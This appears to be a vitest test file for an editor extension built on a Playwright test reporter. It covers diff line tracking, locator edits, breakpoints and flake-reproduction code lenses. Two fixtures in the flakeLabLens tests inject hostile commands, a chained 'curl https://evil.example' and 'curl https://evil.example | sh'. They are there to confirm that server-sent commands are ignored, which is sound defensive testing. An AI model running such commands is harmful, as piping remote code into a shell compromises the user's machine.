import { describe, expect, test } from 'vitest';
import { diffLines } from '@piwitests/core/line-diff';
import * as path from 'node:path';
import {
  breakpointsNotice,
  callEndLine,
  flakeLabLens,
  headedCommand,
  locatorChainOnLine,
  pauseAtValue,
  pickEditOnLine,
  placeLine,
} from '../src/analysis';
import type { FlakeLabEntry } from '../src/piwi-client';

describe('placeLine', () => {
  /** A spec as the run saw it: the failing call on line 3. */
  const before = [
    "test('pays', async ({ page }) => {",
    "  await page.goto('/cart');",
    '  await row().click();',
    '});',
    '',
  ];
  const place = (line: number, after: string[]) =>
    placeLine(line, diffLines('a.spec.ts', before.join('\n'), after.join('\n')).hunks);

  test('a line before every hunk, or with no hunk at all, stays where it is', () => {
    expect(placeLine(3, [])).toEqual({ line: 3, state: 'same' });
    expect(place(3, [...before.slice(0, 3), '});', '', "test('more', () => {});"])).toEqual({ line: 3, state: 'same' });
  });

  test('a line below a hunk shifts by its net size', () => {
    expect(place(3, ['// a note', '', ...before])).toEqual({ line: 5, state: 'moved' });
    // Past the last hunk, through every hunk above: two lines added, one removed.
    expect(place(4, ['x', 'y', before[0]!, before[2]!, before[3]!, ''])).toEqual({ line: 5, state: 'moved' });
    // A hunk that replaces a line with one line leaves the lines below on their own number.
    expect(place(3, [before[0]!, "  await page.goto('/basket');", ...before.slice(2)])).toEqual({
      line: 3,
      state: 'same',
    });
  });

  test('a line of a replaced block is found among the added lines, whatever its indent', () => {
    const after = [
      before[0]!,
      "  await page.goto('/basket');",
      '  const r = row();',
      '    await row().click();',
      '});',
    ];
    expect(place(3, after)).toEqual({ line: 4, state: 'moved' });
  });

  test('of several added lines holding its text, the nearest to where it stood', () => {
    const steps = [
      before[0]!,
      '  await first().click();',
      '  await second().click();',
      '  await row().click();',
      '});',
    ];
    const wrapped = [
      before[0]!,
      '    await row().click();',
      '    await a();',
      '    await b();',
      '    await row().click();',
      '});',
    ];
    expect(placeLine(4, diffLines('a.spec.ts', steps.join('\n'), wrapped.join('\n')).hunks)).toEqual({
      line: 5,
      state: 'moved',
    });
  });

  test('a line rewritten is edited, on the first line of what replaced it', () => {
    expect(
      place(3, [
        before[0]!,
        before[1]!,
        '  await rows().first().click();',
        '  await expect(rows()).toHaveCount(2);',
        '});',
      ]),
    ).toEqual({
      line: 3,
      state: 'edited',
    });
    // Below an insertion, the hunk's first added line has moved too.
    expect(place(3, ['// a note', before[0]!, before[1]!, '  await rows().first().click();', '});'])).toEqual({
      line: 4,
      state: 'edited',
    });
  });

  test('a line removed is edited, on the line before the removal', () => {
    expect(place(3, [before[0]!, before[1]!, '});', ''])).toEqual({ line: 2, state: 'edited' });
    // A removal at the top of the file: its first line.
    expect(place(1, before.slice(1))).toEqual({ line: 1, state: 'edited' });
  });
});

describe('callEndLine', () => {
  const lines = (text: string) => text.split('\n');

  test('ends on the line of the parenthesis that closes the call', () => {
    const spec = lines(
      ["test('pays', async ({ page }) => {", "  await page.goto('/cart');", '});', 'after();'].join('\n'),
    );
    expect(callEndLine(spec, 0, 4)).toBe(2);
    expect(callEndLine(lines("test('one line', () => {});"), 0, 4)).toBe(0);
  });

  test('skips brackets inside strings, template literals and comments', () => {
    const spec = lines(
      [
        "test('a ) in the title', async () => {",
        '  const s = "(" + \')\';',
        '  const t = `${[1, 2].map((n) => `(${n}`)} }`;',
        '  // an unbalanced ( in a comment',
        '  /* and ) in',
        '     a block comment ( */',
        '});',
      ].join('\n'),
    );
    expect(callEndLine(spec, 0, 4)).toBe(6);
  });

  test('gives up on a call that never closes', () => {
    expect(callEndLine(lines("test('open', () => {\n  foo();"), 0, 4)).toBeNull();
  });
});

describe('flakeLabLens', () => {
  const entry = (overrides: Partial<FlakeLabEntry> = {}): FlakeLabEntry => ({
    testCaseId: 12,
    state: 'untested',
    nextCommand: 'npx @piwitests/reporter flake 12',
    flaky: true,
    reproducedBy: null,
    flakeRate: 0.18,
    suspect: { id: 'slow-route:GET /api/cart', label: 'slow GET /api/cart', standing: 'untested', lab: 'untested' },
    ...overrides,
  });

  test('a flaky test with an untested suspect offers to reproduce it', () => {
    expect(flakeLabLens(12, entry())).toEqual({
      title: 'flaky 18% · top suspect: slow GET /api/cart (untested)',
      actions: [{ kind: 'reproduce', title: 'Reproduce this flake', command: 'npx @piwitests/reporter flake 12' }],
    });
  });

  test('a reproduced flake offers to verify the fix too', () => {
    const lens = flakeLabLens(
      12,
      entry({
        state: 'reproduced',
        nextCommand: 'npx @piwitests/reporter flake verify 12',
        reproducedBy: 'delay GET /api/cart 1.8 s',
        suspect: {
          id: 'slow-route:GET /api/cart',
          label: 'slow GET /api/cart',
          standing: 'reproduced',
          lab: 'reproduced 7 of 10',
        },
      }),
    );
    expect(lens?.title).toBe('flaky 18% · top suspect: slow GET /api/cart (reproduced 7 of 10)');
    expect(lens?.actions).toEqual([
      { kind: 'reproduce', title: 'Reproduce this flake', command: 'npx @piwitests/reporter flake 12' },
      { kind: 'verify', title: 'Verify the flake fix', command: 'npx @piwitests/reporter flake verify 12' },
    ]);
  });

  test("builds its commands from the test's id, whatever command the instance sends", () => {
    const lens = flakeLabLens(
      12,
      entry({ state: 'reproduced', nextCommand: 'npx @piwitests/reporter flake verify 12; curl https://evil.example' }),
    );
    expect(lens?.actions.map((a) => a.command)).toEqual([
      'npx @piwitests/reporter flake 12',
      'npx @piwitests/reporter flake verify 12',
    ]);
    expect(flakeLabLens(12, entry({ nextCommand: 'curl https://evil.example | sh' }))?.actions).toEqual([
      { kind: 'reproduce', title: 'Reproduce this flake', command: 'npx @piwitests/reporter flake 12' },
    ]);
  });

  test('a fix that holds, or a test off the ranking with nothing to verify, shows nothing', () => {
    expect(flakeLabLens(12, entry({ state: 'verified', nextCommand: null, flaky: false }))).toBeNull();
    expect(flakeLabLens(12, entry({ flaky: false }))).toBeNull();
  });

  test('an older instance without the rate or the suspect still offers the command', () => {
    const lens = flakeLabLens(12, {
      testCaseId: 12,
      state: 'not-reproduced',
      nextCommand: 'npx @piwitests/reporter flake 12',
      flaky: true,
      reproducedBy: null,
    });
    expect(lens?.title).toBe('flaky');
    expect(lens?.actions.map((a) => a.kind)).toEqual(['reproduce']);
  });
});

describe('a pick at a breakpoint', () => {
  test('replaces the chain the line holds, keeping the page and the action', () => {
    const line = "  await page.locator('.cart-row').nth(2).click();";
    expect(locatorChainOnLine(line)).toEqual({
      start: 13,
      end: 40,
      locator: "locator('.cart-row').nth(2)",
    });
    expect(pickEditOnLine(line, "getByRole('row', { name: 'Mug' })")).toEqual({
      start: 13,
      end: 40,
      newText: "getByRole('row', { name: 'Mug' })",
    });
    const assertion = '  await expect(this.page.getByText("Pay now")).toBeVisible();';
    const edit = pickEditOnLine(assertion, "getByTestId('pay')")!;
    expect(assertion.slice(0, edit.start) + edit.newText + assertion.slice(edit.end)).toBe(
      "  await expect(this.page.getByTestId('pay')).toBeVisible();",
    );
  });

  test('finds nothing on a line without a locator', () => {
    expect(pickEditOnLine('  await checkout.row().click();', "getByTestId('row')")).toBeNull();
    expect(pickEditOnLine('  const myLocator = makeLocator(1);', "getByTestId('row')")).toBeNull();
  });
});

describe('the breakpoints of a run', () => {
  const root = path.resolve('/work/shop');

  test('are the lines under the config folder, relative to it and 1-based', () => {
    expect(
      pauseAtValue(root, [
        { file: path.join(root, 'tests', 'login.spec.ts'), line: 41 },
        { file: path.join(root, 'tests', 'pages', 'checkout.page.ts'), line: 8 },
        { file: path.join(root, 'tests', 'login.spec.ts'), line: 41 },
        { file: path.resolve('/work/other/a.spec.ts'), line: 1 },
        { file: path.join(root, 'tests', 'b.spec.ts'), line: -1 },
      ]),
    ).toBe('tests/login.spec.ts:42;tests/pages/checkout.page.ts:9');
    expect(pauseAtValue(root, [{ file: path.join(root, 'tests', 'a,b.spec.ts'), line: 6 }])).toBe(
      'tests/a,b.spec.ts:7',
    );
    expect(pauseAtValue(root, [{ file: path.resolve('/elsewhere/a.ts'), line: 0 }])).toBeNull();
    expect(pauseAtValue(root, [])).toBeNull();
  });

  test('run headed once', () => {
    expect(headedCommand('npx playwright test "a.spec.ts:3"', ['a.spec.ts:3'])).toEqual({
      command: 'npx playwright test "a.spec.ts:3" --headed',
      args: ['a.spec.ts:3', '--headed'],
    });
    for (const flag of ['--headed', '--ui', '--debug']) {
      expect(headedCommand(`npx playwright test ${flag} a.spec.ts`, [])).toEqual({
        command: `npx playwright test ${flag} a.spec.ts`,
        args: [],
      });
    }
    expect(headedCommand('npx playwright test --grep "--headed-mode"', [])).toEqual({
      command: 'npx playwright test --grep "--headed-mode" --headed',
      args: ['--headed'],
    });
  });

  test('need a reporter that pauses at them', () => {
    expect(breakpointsNotice('0.46.0')).toBe(
      'Breakpoints need @piwitests/reporter 0.48.0 or later; this project has 0.46.0.',
    );
    expect(breakpointsNotice('0.47.9')).toMatch(/this project has 0\.47\.9\.$/);
    expect(breakpointsNotice('0.48.0')).toBeNull();
    expect(breakpointsNotice('0.48.0-beta.1')).toBeNull();
    expect(breakpointsNotice('1.0.0')).toBeNull();
    expect(breakpointsNotice(null)).toBeNull();
    expect(breakpointsNotice('workspace:*')).toBeNull();
  });
});
